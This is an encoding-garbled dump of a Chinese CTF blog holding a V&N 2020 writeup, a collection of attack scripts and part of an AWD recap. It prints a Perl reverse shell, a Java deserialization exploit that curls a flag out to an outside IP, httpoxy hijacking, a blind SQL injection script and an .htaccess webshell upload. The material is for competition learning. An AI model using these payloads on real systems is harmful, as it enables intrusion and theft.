_config.xml12345678feed: type: atom path: rss.xml limit: 20 hub: content: content_limit: content_limit_delim: ' ' å†åˆ° 1/theme/minos/_config.xml æ·»åŠ å›¾æ ‡ _config.xml1234navbar_links: RSS: icon: fas fa-rss url: /rss.xml ç„¶åé‡æ–°ç”Ÿæˆ 1hexo clean; hexo g; æ•ˆæœå¦‚ä¸‹ å°±å¯ä»¥å¿«ä¹çš„æ·»åŠ è®¢é˜…äº† æ—¶é—´æ ¼å¼æ›´æ–°å°†æ—¶é—´æ ¼å¼æ”¹ä¸ºå…·ä½“çš„æ—¥æœŸ æœ¬æ–‡ä½œè€…: cjm00næœ¬æ–‡åœ°å€: https://cjm00n.top/2020/02/25/Minosä¸»é¢˜ä¿®æ”¹æŒ‡å—/ ç‰ˆæƒå£°æ˜: é™¤ç‰¹åˆ«è¯´æ˜å¤–ï¼Œæ‰€æœ‰æ–‡ç« å‡é‡‡ç”¨ CC BY 4.0 è®¸å¯åè®®ï¼Œè½¬è½½è¯·å…ˆå–å¾—åŒæ„ã€‚","link":"/2020/02/25/Minos%E4%B8%BB%E9%A2%98%E4%BF%AE%E6%94%B9%E6%8C%87%E5%8D%97/"},{"title":"V&Nå…¬å¼€èµ›2020 writeup","text":"ç»™èµµå¸ˆå‚…é€’èŒ¶, AKæ˜¯ä¸å¯èƒ½AKçš„ checkiné¦–å…ˆæ˜¯ç­¾åˆ°é¢˜, å…ˆçœ‹ä¸€ä¸‹ä»£ç  123456789101112131415161718192021222324252627from flask import Flask, requestimport osapp = Flask(__name__)flag_file = open(\"flag.txt\", \"r\")# flag = flag_file.read()# flag_file.close()## @app.route('/flag')# def flag():# return flag## want flag? naive!# You will never find the thing you want:) I think@app.route('/shell')def shell(): os.system(\"rm -f flag.txt\") exec_cmd = request.args.get('c') os.system(exec_cmd) return \"1\"@app.route('/')def source(): return open(\"app.py\",\"r\").read()if __name__ == \"__main__\": app.run(host='0.0.0.0') é¦–å…ˆå¯ä»¥æ˜ç¡®, åœ¨æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™è¿™ä¸ªflag.txtå·²ç»è¢«åˆ äº†, ä¸å­˜åœ¨ä»€ä¹ˆæ¡ä»¶ç«äº‰çš„ è€Œæˆ‘ä»¬è§‚å¯Ÿä¸€ä¸‹ç¨‹åºçš„æ­¥éª¤ 123flag_file = open(\"flag.txt\", \"r\")....os.system(\"rm -f flag.txt\") ç¬¬ä¸€æ­¥å…ˆæ‰“å¼€äº†æ–‡ä»¶, ç„¶åå†å¯¹æ–‡ä»¶åˆ é™¤, çœ‹åˆ°è¿™ä¸ªå°±æƒ³èµ·äº†ä¸€ä¸ªè¿œå¤çš„çŸ¥è¯†ç‚¹, æˆ‘ä¹Ÿä¸è®°å¾—æ˜¯å­¦ä»€ä¹ˆçœ‹åˆ°çš„äº† https://blog.csdn.net/wyzxg/article/details/12654639 å½“ç¨‹åºæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶, ä¼šè·å¾—ç¨‹åºçš„æ–‡ä»¶æè¿°ç¬¦, è€Œæ­¤æ—¶å¦‚æœæ–‡ä»¶è¢«åˆ é™¤, åªä¼šåˆ é™¤æ–‡ä»¶çš„ç›®å½•é¡¹, ä¸ä¼šæ¸…ç©ºæ–‡ä»¶çš„å†…å®¹, åŸæ¥çš„è¿›ç¨‹ä¾ç„¶å¯ä»¥é€šè¿‡æè¿°ç¬¦å¯¹æ–‡ä»¶è¿›è¡Œè¯»å–, ä¹Ÿå°±æ˜¯è¯´, æ–‡ä»¶è¿˜å­˜åœ¨å†…å­˜é‡Œ, è€Œå…·ä½“çš„ä½ç½®åœ¨ 1/proc//fd/ ä¸‹é¢ç”¨æœ¬åœ°çš„ä¾‹å­ä¸¾ä¾‹ é¦–å…ˆåˆ›å»ºflag.txt ç„¶åè¿è¡Œ 1python app.py ä¹‹åæˆ‘ä»¬è®¿é—®shell, å°±å¯ä»¥çœ‹åˆ°æ–‡ä»¶å·²ç»è¢«åˆ é™¤äº† å¦‚ä½•æ‰¾åˆ°æ–‡ä»¶åœ¨å†…å­˜ä¸­çš„ä½ç½®å‘¢, åˆ©ç”¨lsof 1lsof|grep flag.txt å…¶ä¸­ç¬¬äºŒåˆ—çš„3512å°±æ˜¯ åœ¨ç¨‹åºä¸­æ‰“å¼€ 12cd /proc/3512/fdls -al å¯ä»¥çœ‹åˆ°3å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„æ–‡ä»¶, ç›´æ¥catå³å¯ ä¸è¿‡è¿™é‡Œæœ‰ä¸¤ä¸ªé—®é¢˜, é¦–å…ˆæ˜¯å¦‚ä½•åå¼¹shell åœ¨åšé¢˜çš„æ—¶å€™å‘ç° (ä½¿ç”¨å†…ç½‘çš„linux labs), åœ¨ç¯å¢ƒä¸­æ‰§è¡Œ 1curl http://ip:port å´ä¸èƒ½ç›‘å¬åˆ°è®¿é—®, ä¸€åº¦æ€€ç–‘ä¸åœ¨å†…ç½‘, è¿˜é‡å¼€äº†ä¸¤æ¬¡ (é”™å¤±ä¸€è¡€hhh è¿™é‡Œæ­ªä¸ªæ¥¼, åœ¨å‡ºé¢˜äººçš„ç¯å¢ƒé…ç½®ä¸å¯¹çš„æƒ…å†µä¸‹, æˆ‘ä»¬å¯ä»¥é€šè¿‡ 1ls|base64>>app.py çš„æ–¹å¼æ¥å†™å…¥app.py, ä»è€Œä¸ç”¨åå¼¹shellä¹Ÿå¯ä»¥çœ‹åˆ°å›æ˜¾, å½“ç„¶èµµå¸ˆå‚…æ²¡ç•™ä¸‹è¿™ä¸ªæœºä¼š(x ä¸Šç½‘æœäº†å¾ˆå¤šä¸ªåå¼¹shellçš„payload http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html æœ€åæ‰¾åˆ°ä¸€ä¸ªèƒ½ç”¨çš„ 1perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"ip:port\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while;' ç„¶åæˆåŠŸè¿”å›shell, ä½†æ˜¯å‘ç°ç¬¬äºŒä¸ªé—®é¢˜, ä¸Šé¢æ²¡æœ‰lsof, psä¹Ÿæ²¡æœ‰ååº” è¿›å» 1cd /proc/ çœ‹äº†ä¸€ä¸‹, å‘ç°åªæœ‰å‡ ä¸ª, å°±ç›´æ¥éå†ä¸€ä¸‹hhhh å¾ˆå¿«å°±èƒ½çœ‹åˆ°äº† TimeTravelä»£ç å¾ˆç®€æ´, å¾ˆèµµå¸ˆå‚… 12345678910111213141516171819202122232425get('http://127.0.0.1:5000/api/eligible'); $content = $response->getBody(); $data = json_decode($content, TRUE); if($data['success'] === true) { echo system('/readflag'); }}if(isset($_GET['file'])) { highlight_file($_GET['file']);}if(isset($_GET['phpinfo'])) { phpinfo();} æˆ‘ä»¬å…ˆçœ‹ç†Ÿæ‚‰çš„éƒ¨åˆ†, ä¸‹é¢å¯ä»¥çœ‹åˆ°æœ‰è¯»æ–‡ä»¶å’Œphpinfoçš„åœ°æ–¹, æˆ‘ä»¬å°±å…ˆçœ‹phpinfo æ²¡æœ‰ä»€ä¹ˆæœ‰æ„æ€çš„åœ°æ–¹( å¤§æ¦‚ ç„¶åæˆ‘ä»¬å°±è¯»æ–‡ä»¶å§, è¿™ç§ç¨‹åºçš„ç»“æ„å’Œtpå¾ˆåƒ, æˆ‘ä»¬é¦–å…ˆè¯»ä¸€ä¸‹ 1composer.json å¯ä»¥æ˜ç¡®çš„æ˜¯, ç¨‹åºä»£ç è¿™ä¹ˆå°‘, è‚¯å®šæ˜¯ç»„ä»¶æ´, æ€»ä¸èƒ½ä¸€ä¸ªhighlight_fileå°±èƒ½RCEæ˜¯å§hhhh ä½†æ˜¯ä¸æ€¥, ç»§ç»­è¯»ä¸€è¯», æˆ‘å¾ˆå¥½å¥‡ä¸­é—´çš„è¿™ä¸ª 1http://127.0.0.1:5000/api/eligible æ˜¯ä»€ä¹ˆ, è¿™ä¸ªæ€ä¹ˆè¯»å‘¢, æˆ‘ä»¬çŸ¥é“dockerä¸€èˆ¬ä¼šæœ‰ä¸ªstart.sh, ç»å¸¸ä¼šåœ¨æ ¹ç›®å½•æˆ–è€…/tmpæˆ–è€…~, è¯•ä¸€ä¸‹å°±ä¼šå‘ç°åœ¨æ ¹ç›®å½• ç„¶åå°±èƒ½çœ‹åˆ°ç¨‹åºçš„è·¯å¾„, è¯»ä¸€ä¸‹ 1/srv/app.py è¿™é‡Œé¢˜ç›®å·²ç»å¾ˆæ˜ç¡®äº†, åªè¦ç­‰åˆ°2050å¹´å°±å¯ä»¥æ‹¿åˆ°flag, å› æ­¤è¿™é‡Œæˆ‘å°±ç­‰äº† (xxx è¯»å®Œäº†æºç æˆ‘ä»¬å»çœ‹çœ‹åŸæ¥çš„é‚£ä¸ªç»„ä»¶çš„ç‰ˆæœ¬, æœ‰æ²¡æœ‰ä»€ä¹ˆæ¼æ´ æœä¸€ä¸‹å¾ˆå¿«å°±ä¼šå‘ç°ä¸‹é¢è¿™äº›ä¸œè¥¿ https://httpoxy.org/ https://www.laruence.com/2016/07/19/3101.html å°±æ˜¯è¯´è¿™ä¸ªç¨‹åºä¼šå°†è¯·æ±‚å¤´ä¸­çš„ 1PROXY:ip:port æ³¨å†Œä¸ºå…¨å±€å˜é‡, ç±»ä¼¼äº 1http_proxy=ip:port command æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åŠ«æŒä¸€ä¸‹è¿”å›å³å¯ åœ¨Linux labsé‡Œé¢, å…ˆå»ºä¸€ä¸ªindex.php 1234true); header(\"Content-Type:application/json\"); echo json_encode($arr); ç„¶åè¿è¡Œ 1php -S 0:2333 æœ‰å¸ˆå‚…åé¢é—®åˆ°, è¿™é‡Œæä¸€ä¸‹, ä»£ç†å¹¶ä¸éœ€è¦å’ŒåŸæ¥çš„ç«¯å£ä»¥åŠè·¯å¾„ä¸€è‡´, åªéœ€è¦ç»™ä¸€ä¸ªåˆé€‚çš„è¿”å›å°±å¯ä»¥äº†, è€Œè¿™ä¸ªå‘½ä»¤æ˜¯å¯åŠ¨phpå†…ç½®çš„ä¸€ä¸ªwebæœåŠ¡å™¨, å¦‚æœæ–‡ä»¶åä¸ºindex.php æˆ‘ä»¬å¯ä»¥é€šè¿‡ 1http://ip:port/ æ¥è®¿é—®, å¦‚æœæ˜¯å…¶ä»–çš„å‘½ååˆ™éœ€è¦ 1http://ip:port/filename.php è¿™æ ·æ¥è®¿é—®, å› æ­¤è¿™é‡Œå¿…é¡»è¦è®¾ç½®ä¸ºindex.php åé¢åŠ ä¸Šè¯·æ±‚å¤´è®¿é—®å³å¯ HappyCTFdçœ‹åˆ°å°±çŒœæ˜¯CTFdçš„æ¼æ´äº†, æ¯•ç«Ÿå‰æ®µæ—¶é—´åˆšçˆ†äº†ä¸€ä¸ª https://www.colabug.com/2020/0204/6940556/ å¤§æ¦‚å°±æ˜¯è¯´, åœ¨å¿˜è®°å¯†ç éªŒè¯çš„æ—¶å€™, ä¼šå¯¹ç”¨æˆ·åè¿›è¡Œ 1strip() çš„æ“ä½œ, é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ³¨å†Œä¸€ä¸ª 1admin çš„è´¦å·, ç„¶åå¿˜è®°å¯†ç å³å¯æ¥ç®¡ç®¡ç†å‘˜çš„è´¦å·(éœ€è¦ä½¿ç”¨å†…ç½‘é‚®ä»¶ç³»ç»Ÿ) è¿™ä¸ªå°±ä¸æ¼”ç¤ºäº†, ç™»å½•åå¯ä»¥è¿›å»ç®¡ç†ç•Œé¢, æ­è¿‡CTFdçš„åº”è¯¥éƒ½çŸ¥é“, ä»–é‡Œé¢æœ‰ä¸€ä¸ª 1Backup çš„åŠŸèƒ½, ä¼šæŠŠæ‰€æœ‰çš„è®°å½•å¤‡ä»½ä¸‹æ¥, æˆ‘ä»¬ç›´æ¥ç”¨å®ƒä¸‹è½½å…¨éƒ¨å†…å®¹ å°±å¯ä»¥çœ‹åˆ°flagäº† EasySpringMVCæ˜¯ä¸ªjavaé¢˜, äººç”Ÿç¬¬ä¸€ä¸ªæ­£ç»javaé¢˜, ç„¶è€Œæ²¡åšå‡ºæ¥â€” å…ˆçœ‹ä¸€ä¸‹ä»£ç , æˆ‘ä»¬å¯ä»¥ä½¿ç”¨jd-guiæ‰“å¼€è¿™ä¸ªwaråŒ… çœ‹ä¸€çœ¼web.xml çœ‹ä¸å‡ºå•¥æœ‰ç”¨çš„, å°±å»ç¿»ä»£ç , ä¸ºäº†å¥½çœ‹ä¸€ç‚¹æˆ‘å¤åˆ¶å‡ºæ¥åœ¨vscodeçœ‹äº† åœ¨ 1WEB-INF\\classes\\com\\filters\\ClientInfoFilter.java å¯ä»¥çœ‹åˆ°æœ‰è¿™æ®µ, æ˜æ˜¾æ˜¯ä¸€ä¸ªååºåˆ—åŒ–æ„é€ , å¯ä»¥ä¼ªé€ cookieå˜æˆç®¡ç†å‘˜ ç¼–å†™expå¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.io.*;import java.util.Base64;import com.tools.*;public class test { public static void main(String[] args) { Base64.Encoder encoder = Base64.getEncoder(); try { ClientInfo cinfo = new ClientInfo(\"admin\", \"webmanager\", \"CC79398F535DB34F13B667D3C079BF00\"); byte[] bytes = Tools.create(cinfo); String payload = encoder.encodeToString(bytes); System.out.println(payload); } catch (Exception e) { e.printStackTrace(); } }}class Tools implements Serializable { private static final long serialVersionUID = 1L; public static Object parse(byte[] bytes) throws Exception { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); } private String testCall; public static byte[] create(Object obj) throws Exception { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[]) obj)).start(); }} è¿˜éœ€è¦æŠŠClientInfoç±»æ”¾åœ¨ 1com/tools/ClientInfo.java æŠŠæ„é€ ç±»çš„ç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸ºä½ çš„SESSIONIDå³å¯ è¿è¡Œåå°†è¾“å‡ºçš„base64å¡«åˆ°cookieå°±å¯ä»¥äº† ç„¶åæˆ‘ä»¬å°±èƒ½è·å¾—æ–‡ä»¶ä¸Šä¼ çš„æœºä¼š, ä½†æ˜¯é—®é¢˜å°±åœ¨è¿™é‡Œ, æˆ‘ç»è¿‡å¾ˆå¤šæ¬¡å°è¯• å‘ç°åªèƒ½ä¸Šä¼ åœ¨ 1/tmp ç›®å½•ä¸‹ å…¶ä»–çš„ç›®å½•å°±ä¼špermission denied è€Œæˆ‘ä»¬çš„è°ƒç”¨æ˜¯è¿™æ ·çš„ 12345678910111213141516171819202122232425262728293031public class PictureController{ @RequestMapping({\"/showpic.form\"}) public String index(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String file) throws Exception { if (file == null) file = \"showpic.jsp\"; String[] attribute = file.split(\"\\\\.\"); String suffix = attribute[attribute.length - 1]; if (!suffix.equals(\"jsp\")) { boolean isadmin = ((ClientInfo)httpServletRequest.getSession().getAttribute(\"cinfo\")).getName().equals(\"admin\"); if (!isadmin && (!suffix.equals(\"jpg\") || !suffix.equals(\"gif\"))) { return \"onlypic\"; } show(httpServletRequest, httpServletResponse, file); return \"showpic\"; } StringBuilder stringBuilder = new StringBuilder(); for (int i = 0; i < attribute.length - 1; i++) { stringBuilder.append(attribute[i]); } String jspFile = stringBuilder.toString(); int unixSep = jspFile.lastIndexOf('/'); int winSep = jspFile.lastIndexOf('\\\\'); int pos = (winSep > unixSep) ? winSep : unixSep; jspFile = (pos != -1) ? jspFile.substring(pos + 1) : jspFile; if (jspFile.equals(\"\")) { jspFile = \"showpic\"; } return jspFile; } å¯ä»¥çœ‹åˆ°ä¸»è¦åˆ†ä¸¤éƒ¨åˆ†, ä¸€éƒ¨åˆ†æ˜¯åç¼€åä¸ºjsp 12345678910111213StringBuilder stringBuilder = new StringBuilder();for (int i = 0; i < attribute.length - 1; i++) { stringBuilder.append(attribute[i]);}String jspFile = stringBuilder.toString();int unixSep = jspFile.lastIndexOf('/');int winSep = jspFile.lastIndexOf('\\\\');int pos = (winSep > unixSep) ? winSep : unixSep;jspFile = (pos != -1) ? jspFile.substring(pos + 1) : jspFile;if (jspFile.equals(\"\")) { jspFile = \"showpic\";}return jspFile; æœäº†æœæ˜¯æ¥è‡ªä¸€ä¸ªæŒºå®˜æ–¹çš„åº“, æ²¡å•¥æ–¹æ³•å¯ä»¥ç”¨, è¿™ä¸ªjspFileåé¢ä¼šç»è¿‡ å°±ä¼šå˜æˆ 1/WEB-INF/*.jsp å¾ˆé—æ†¾è¿™ä¸ªæ–‡ä»¶å¤¹æˆ‘ä»¬æ˜¯æ²¡æœ‰èƒ½åŠ›ä¸Šä¼ çš„, å¹¶ä¸”å‰é¢è¿˜æœ‰ä¸€ä¸ª 12String[] attribute = file.split(\"\\\\.\"); String suffix = attribute[attribute.length - 1]; å»æ‰æ‰€æœ‰çš„., ä¹Ÿä¸èƒ½ç›®å½•ç©¿è¶Š, è€Œå¦‚æœåç¼€ä¸æ˜¯jsp 123456String[] attribute = file.split(\"\\\\.\");String suffix = attribute[attribute.length - 1];if (!suffix.equals(\"jsp\")) { show(httpServletRequest, httpServletResponse, file); return \"showpic\";} showæ–¹æ³•å¦‚ä¸‹ 12345678910111213141516private void show(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String filename) throws Exception { httpServletResponse.setContentType(\"image/jpeg\"); InputStream in = httpServletRequest.getServletContext().getResourceAsStream(\"/WEB-INF/resource/\" + filename); if (in == null) { in = new FileInputStream(filename); } ServletOutputStream servletOutputStream = httpServletResponse.getOutputStream(); byte[] b = new byte[1024]; while (in.read(b) != -1) { servletOutputStream.write(b); } in.close(); servletOutputStream.flush(); servletOutputStream.close(); } é¦–å…ˆç¬¬ä¸€ä¸ªè·å–çš„åœ°æ–¹ 1InputStream in = httpServletRequest.getServletContext().getResourceAsStream(\"/WEB-INF/resource/\" + filename); è¿™ä¸ªå‡½æ•°å½“å‚æ•°æ˜¯/å¼€å§‹, å°±ä¸èƒ½ç©¿è¶Šåˆ°æ›´é«˜çš„ç›®å½•, ä¹Ÿå°±æ˜¯æœ€å¤šåœ¨/WEB-INF/åŒçº§, åŒ…å«ä¸åˆ°/tmpç›®å½•, èƒ½ç”¨çš„åªæœ‰ä¸‹é¢çš„ä»»æ„æ–‡ä»¶è¯»äº† 1in = new FileInputStream(filename); ä½†æ˜¯è¿™é¢˜æ˜¯éœ€è¦RCEçš„, æœ‰ä¸ª/readflag è¿™ä¸ªé¢˜åšäº†ä¸€å¤©, éƒ½æ²¡æœ‰è¿›å±•, å°è¯•äº†å¾ˆå¤šåç¼€å, ä½†æ˜¯éƒ½æ— æ³•è§£æ AKè¿™è¾ˆå­éƒ½ä¸å¯èƒ½AKçš„ è§£é¢˜ä¸´è¿‘ç»“æŸçš„æ—¶å€™çœ‹åˆ°äº†æ´hhh åœ¨Toolsç±»çš„è¿™é‡Œ å…¶å®å°±æ˜¯ä¸ªåé—¨, ä½†æ˜¯ä¸€ç›´æ²¡æ³¨æ„åˆ°(x, è¦åˆ©ç”¨è¿™ä¸ªå‡½æ•°çš„è¯, æˆ‘ä»¬éœ€è¦ååºåˆ—åŒ–ä¸€ä¸ªToolsç±» ç„¶åé—®é¢˜å°±æ¥äº†, æ‰“åˆ°æ¯”èµ›ç»“æŸä¸€ç›´æ²¡æˆåŠŸ, å’Œ@æ¨å¤§æ ‘ä»¥åŠ@P3rh4psä¸¤ä½å¸ˆå‚…äº¤æµäº†ä¸€ä¸‹, å¯ä»¥é€šè¿‡é‡å†™writeObjectæ–¹æ³•æ¥å®ç° æˆ–è€…è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥å†™ é“ç†éƒ½æ˜¯ä¸€æ ·çš„, éƒ½æ˜¯é€šè¿‡æ„é€ ä¸€ä¸ªString[]å¯¹è±¡æ¥ä¼ ç»™ProcessBuilderè¿›è¡Œæ‰§è¡Œ, æ‰§è¡Œçš„éƒ¨åˆ†åˆ™æ˜¯å°†éœ€è¦ç©ºæ ¼åˆ†éš”çš„åœ°æ–¹, åˆ†éš”æˆä¸åŒçš„å­—ç¬¦ä¸², ä¾‹å¦‚ 12/bin/sh -c \"curl http://ip:port/`/readflag`\"{\"/bin/sh\", \"-c\", \"curl http://ip:port/`/readflag`\"} å®Œæ•´çš„expå¦‚ä¸‹ Tools.java12345678910111213141516171819202122232425262728293031package com.tools;import java.io.*;public class Tools implements Serializable { private static final long serialVersionUID = 1L; public static Object parse(byte[] bytes) throws Exception { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); } private String[] testcall={\"/bin/sh\",\"-c\",\"curl http://174.0.218.211:2333/`/readflag`\"}; public static byte[] create(Object obj) throws Exception { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[]) obj)).start(); } private void writeObject(ObjectOutputStream out) throws IOException { String[] cmd = {\"/bin/sh\",\"-c\",\"curl http://174.0.218.211:2333/`/readflag`\"}; out.writeObject(cmd); }} ç”Ÿæˆçš„éƒ¨åˆ† exp.java1234567891011121314151617import java.io.*;import java.util.Base64;import com.tools.*;public class exp { public static void main(String[] args) { Base64.Encoder encoder = Base64.getEncoder(); try { Tools cinfo = new Tools(); byte[] bytes = Tools.create(cinfo); String payload = encoder.encodeToString(bytes); System.out.println(payload); } catch (Exception e) { e.printStackTrace(); } }} é‡æ–°ä¸‹å‘äº†ä¸€ä¸ªç¯å¢ƒ, å°†ç”Ÿæˆçš„éƒ¨åˆ†æ”¾åˆ°cookie, å°±å¯ä»¥æ¥å—flagäº† æˆ–è€…å°†è¾“å‡ºå†™åˆ°/tmp/ä¸‹, ç„¶åé€šè¿‡ä»»æ„æ–‡ä»¶è¯»æ‹¿flagä¹Ÿå¯ å†æ¬¡æ„Ÿè°¢ä¸¤ä½å¸ˆå‚…çš„å¸®åŠ©å’Œèµµå¸ˆå‚…çš„é¢˜ç›® æœ¬æ–‡ä½œè€…: cjm00næœ¬æ–‡åœ°å€: https://cjm00n.top/2020/02/29/V-Nå…¬å¼€èµ›2020-writeup/ ç‰ˆæƒå£°æ˜: é™¤ç‰¹åˆ«è¯´æ˜å¤–ï¼Œæ‰€æœ‰æ–‡ç« å‡é‡‡ç”¨ CC BY 4.0 è®¸å¯åè®®ï¼Œè½¬è½½è¯·å…ˆå–å¾—åŒæ„ã€‚","link":"/2020/02/29/V-N%E5%85%AC%E5%BC%80%E8%B5%9B2020-writeup/"},{"title":"å¸¸ç”¨è„šæœ¬","text":"è®°å½•ä¸€ä¸‹å¸¸ç”¨çš„ä¸€äº›è„šæœ¬ SQLäºŒåˆ†ç›²æ³¨1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import requestsfrom time import sleepurl = \"http://8fd845b8-4242-4441-ab34-57c8386d5faf.node3.buuoj.cn/backend/content_detail.php\"proxies = { \"http\": \"127.0.0.1:8080\"}def attack(cur, mid=\"\"): # payload = \"if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,0)\" % (cur, mid) # payload = \" or length((select group_concat(password) from users))={}#\".format(cur) # ä¸€å¼€å§‹æŠŠ#å†™æˆ%23, ç»“æœä¸€ç›´ä¸å¯¹, åé¢æ‰æƒ³èµ·pythonä¼šè‡ªåŠ¨ç¼–ç ... # payload = \" or if(ascii(substr((select group_concat(password) from users),%d,1))>%d,1,0)#\" % (cur, mid) # payload = \"0^(ascii(substr(((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database()))),%d,1))>%d)\" % (cur, mid) payload = \"0^(ascii(substr((select(group_concat(password))from(admin)),%d,1))>%d)\" % (cur, mid) data = { \"id\": payload } res = requests.get(url, params=data, proxies=proxies) # print(res.text) if res.status_code == 429: print('too fast') if \"content\" in res.text: return True else: return Falsedef try_length(): for i in range(1, 10): if attack(i): print(i) break sleep(0.02)def main(): flag = \"\" for i in range(1, 22): end = 127 start = 31 mid = (end + start) // 2 while end > start: if attack(i, mid): start = mid + 1 else: end = mid mid = (end + start) // 2 sleep(0.02) flag += chr(mid) print(flag)if __name__ == \"__main__\": # try_length() main() SSTIåˆ¤æ–­å›¾ .htaccessä¸Šä¼ getshell1234567891011121314151617181920212223242526import requestsimport base64url = r\"http://2eab5f94-4cfd-41dc-ac5d-6cda977d7ce4.node3.buuoj.cn//?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&%fe=get_the_flag\"# SIZE_HEADER = b\"#define width 1\\n#define height 1\\n\\n\"SIZE_HEADER = b\"\\x00\\x00\\x8a\\x39\\x8a\\x39\"htaccess = SIZE_HEADER + b\"\"\"AddType application/x-httpd-php .ccphp_value auto_prepend_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/shell.cc\"\"\"\"files = [ (\"file\",(\".htaccess\", htaccess, \"image/gif\"))]proxy = {\"http\": \"127.0.0.1:8080\"}res = requests.post(url, files=files, proxies=proxy).textprint(res)shell = SIZE_HEADER + b\"00\" + base64.b64encode(b\"\")files = [ (\"file\",(\"shell.cc\", shell, \"image/gif\"))]proxy = {\"http\": \"127.0.0.1:8080\"}res = requests.post(url, files=files, proxies=proxy).textprint(res) æœ¬æ–‡ä½œè€…: cjm00næœ¬æ–‡åœ°å€: https://cjm00n.top/2020/02/16/å¸¸ç”¨è„šæœ¬/ ç‰ˆæƒå£°æ˜: é™¤ç‰¹åˆ«è¯´æ˜å¤–ï¼Œæ‰€æœ‰æ–‡ç« å‡é‡‡ç”¨ CC BY 4.0 è®¸å¯åè®®ï¼Œè½¬è½½è¯·å…ˆå–å¾—åŒæ„ã€‚","link":"/2020/02/16/%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC/"},{"title":"Xmanç»“è¥èµ›AWDæ€»ç»“","text":"Xman20å¤©ç»“æŸäº†, æ„Ÿè°¢å„è·¯å¤§ä½¬æŠ¬æˆ‘ä¸€æ‰‹, ç¬¬äºŒæ¬¡æ‰“AWD, è™½ç„¶è¿˜æ˜¯å¾ˆèœ, ä½†æ€»ä¸è‡³äºæ¯«æ— è¾“å‡ºäº†, è†œä¸€æ³¢@q4nå’Œ@Cosmos, ç”±äºæ€»ç»“çš„æ—¶å€™å·²ç»è¿‡å»ä¸¤å¤©äº†, å½“æ—¶çš„å›¾éƒ½æ²¡ç•™ä¸‹æ¥, å¾ˆå¤šåœ°æ–¹å¤§å®¶å°±æ„ä¼šä¸€ä¸‹å§æˆ‘è¿˜æ˜¯è§‰å¾—è¿™ä¸ªèµ›åˆ¶å¾ˆç¥å¥‡, ç«Ÿç„¶æœ‰å¯ä»¥æ‰“è‡ªå·±å‡ºçš„é¢˜çš„æ¯”èµ› å‡†å¤‡è¿˜æ˜¯å¤ªæµªäº†, ç»“è¥èµ›å‰ä¸€å¤©æ‰å¼€å§‹å‡†å¤‡, æœ¬æ¥æƒ³ä¸Š@ç‹ä¸€èˆªå¸ˆå‚…çš„æ¡†æ¶ AWD Framework , ä½†æ˜¯å‡†å¤‡çš„æ¯”è¾ƒæ™šæ²¡ææ‡‚, å°±è¿˜æ˜¯ä¸Šç½‘æ‰¾äº†æ•£è£…è„šæœ¬ç”¨äº†, åé¢ä¼šæŠŠç”¨åˆ°çš„è„šæœ¬ç½—åˆ—ä¸€ä¸‹ æ¯”èµ›å‰ä¸€æ™šè¿˜æ­å¥½äº†hackmd, ä½†æ˜¯æ²¡æœ‰æ•´æ˜ç™½è™šæ‹Ÿæœºçš„ç½‘ç»œé…ç½®..åªèƒ½æˆ‘è‡ªå·±è¿ä¸Šå», å¯¼è‡´æ¯”èµ›çš„è¿‡ç¨‹äº¤æµéƒ½æ˜¯ç‰©ç†äº¤æµäº†hhhh æ–‡ä»¶äº¤æµ1234# python2python -m SimpleHTTPServer 8000# python3python -m http.server 8000 æ–‡æ¡£äº¤æµæ¨èä½¿ç”¨codimd æ­å»ºæ–¹æ³•å‚è€ƒ https://hackmd.io/c/codimd-documentation/%2Fs%2Fcodimd-docker-deployment è£…å¥½äº†dockerå’Œdocker-composeåªéœ€è¦ä¸‰è¡Œå‘½ä»¤ 123git clone https://github.com/hackmdio/docker-hackmd.gitcd docker-hackmddocker-compose up ç„¶åè®¿é—®localhost:3000å³å¯ å›¾ç‰‡ä¸Šä¼ çš„éƒ¨åˆ†éœ€è¦è¿›å»dockeré‡Œé¢ä¿®æ”¹ä¸€ä¸‹, é»˜è®¤æ˜¯imgurå›¾åºŠ 1234567# è¿›å…¥å®¹å™¨, éœ€è¦å¯¹åº”containeriddocker exec -it containerid /bin/bash# å®‰è£…vimapt update && apt install vim# ä¿®æ”¹vim config.json#ä¿®æ”¹imageuploadtypeä¸ºfilesystem ç„¶åå°±å¯ä»¥æ­£å¸¸ä¼ å›¾ç‰‡äº† è™šæ‹Ÿæœºçš„ç½‘ç»œè®¾ç½®éœ€è¦æ”¹æˆæ¡¥æ¥æ¨¡å¼, è¿™æ ·æ‰èƒ½å’Œä¸»æœºåœ¨åŒä¸€ä¸ªæ®µ, å±€åŸŸç½‘å†…å¯ä»¥æ­£å¸¸è®¿é—® 